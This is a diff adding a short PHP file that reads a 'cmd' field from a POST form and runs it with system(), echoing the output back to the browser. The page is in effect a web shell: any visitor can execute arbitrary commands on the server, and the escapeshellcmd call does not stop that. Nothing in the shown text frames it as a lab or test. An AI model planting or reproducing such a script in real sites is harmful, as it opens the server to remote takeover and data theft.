@@ -1,0 +1,17 @@
+<?php
+
+if($_SERVER["REQUEST_METHOD"] === 'POST'){
+    $cmd = escapeshellcmd($_POST["cmd"]);
+    var_dump($cmd);
+    echo "<pre>";
+    $command = system($cmd, $return);
+    echo "</pre>";
+}
+
+
+?>
+
+<form method="post">
+    <input type="text" name="cmd">
+    <button type="submit">Send</button>
+</form>
